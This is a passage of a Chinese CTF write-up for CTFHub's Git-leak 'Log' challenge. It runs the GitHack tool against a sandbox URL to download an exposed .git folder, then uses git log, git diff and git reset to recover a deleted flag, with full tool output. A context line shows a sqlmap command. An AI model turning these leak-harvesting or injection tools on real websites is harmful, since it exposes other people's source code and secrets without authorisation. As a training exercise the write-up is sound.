@@ -589,3 +589,138 @@ sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 
 
 ------
 
+### 信息泄露
+
+#### Git泄露
+
+##### Log
+
+题目描述如下：
+
+> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题
+
+根据题目描述使用`GitHack`获取`.git`文件夹。
+
+```bash
+┌──(tyd㉿Kali)-[~/ctf]
+└─$ git clone https://github.com/BugScanTeam/GitHack.git
+
+┌──(tyd㉿Kali)-[~/ctf]
+└─$ cd GitHack   
+
+┌──(tyd㉿Kali)-[~/ctf/GitHack]
+└─$ python2 GitHack.py http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git
+
+  ____ _ _   _   _            _                                            
+ / ___(_) |_| | | | __ _  ___| | __                                        
+| |  _| | __| |_| |/ _` |/ __| |/ /                                        
+| |_| | | |_|  _  | (_| | (__|   <                                         
+ \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                 
+ A '.git' folder disclosure exploit.                                       
+                                                                           
+[*] Check Depends
+[+] Check depends end
+[*] Set Paths
+[*] Target Url: http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/                                                                      
+[*] Initialize Target
+[*] Try to Clone straightly
+[*] Clone
+正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800'...
+致命错误：仓库 'http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/' 未找到
+[-] Clone Error
+[*] Try to Clone with Directory Listing
+[*] http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                 
+[-] [Skip][First Try] Target is not support Directory Listing
+[*] Try to clone with Cache
+[*] Initialize Git
+[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                           
+提示：配置使用初始分支名，并消除这条警告，请执行：                         
+提示：                                                                     
+提示：  git config --global init.defaultBranch <名称>                      
+提示：                                                                     
+提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development'。                                                                         
+提示：可以通过以下命令重命名刚创建的分支：                                 
+提示：                                                                     
+提示：  git branch -m <name>                                               
+                                                                           
+[*] Cache files
+[*] packed-refs
+[*] config
+[*] HEAD
+[*] COMMIT_EDITMSG
+[*] ORIG_HEAD
+[*] FETCH_HEAD
+[*] refs/heads/master
+[*] refs/remote/master
+[*] index
+[*] logs/HEAD
+[*] logs/refs/heads/master
+[*] Fetch Commit Objects
+[*] objects/05/4002c4fd9c95edfaa91ba505b6d1dd8f680b32
+[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
+[*] objects/2c/1e32dfd33267f265fda913d29e29572c2ba0be
+[*] objects/58/1bd5a9f51c3a1ba88014543f3c390c8542fde7
+[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
+[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
+[*] objects/54/adac7f5e33aa6122e1c7b04e05cf2c03363c55
+[*] objects/8b/1cb6b6cccaccbac8560385b1300c5494369a16
+[*] Fetch Commit Objects End
+[*] logs/refs/remote/master
+[*] logs/refs/stash
+[*] refs/stash
+[*] Valid Repository
+[+] Valid Repository Success
+
+[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800
+
+┌──(tyd㉿Kali)-[~/ctf/GitHack]
+└─$ cd dist//challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800                                                                                      
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
+└─$ git log                                             
+commit 054002c4fd9c95edfaa91ba505b6d1dd8f680b32 (HEAD -> master)
+Author: CTFHub <sandbox@ctfhub.com>
+Date:   Fri Jul 21 12:09:55 2023 +0000
+
+    remove flag
+
+commit 2c1e32dfd33267f265fda913d29e29572c2ba0be
+Author: CTFHub <sandbox@ctfhub.com>
+Date:   Fri Jul 21 12:09:54 2023 +0000
+
+    add flag
+
+commit 54adac7f5e33aa6122e1c7b04e05cf2c03363c55
+Author: CTFHub <sandbox@ctfhub.com>
+Date:   Fri Jul 21 12:09:54 2023 +0000
+
+
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
+└─$ git diff 2c1e32dfd33267f265fda913d29e29572c2ba0be
+diff --git a/226282577915965.txt b/226282577915965.txt
+deleted file mode 100644
+index 8b1cb6b..0000000
+--- a/226282577915965.txt
++++ /dev/null
+@@ -1 +0,0 @@
+-ctfhub{21b194cfff1432ef1c38d79c}
+
+# git diff查看版本间更改，得到flag：ctfhub{21b194cfff1432ef1c38d79c}
+# 此外还可以 git reset --hard
+
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
+└─$ git reset --hard 2c1e32dfd33267f265fda913d29e29572c2ba0be
+HEAD 现在位于 2c1e32d add flag
+                                                                           
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
+└─$ ls
+226282577915965.txt  50x.html  index.html
+                                                                           
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
+└─$ cat 226282577915965.txt                                     
+ctfhub{21b194cfff1432ef1c38d79c}
+```
+
+提交`ctfhub{21b194cfff1432ef1c38d79c}`即可。
+
+------
+
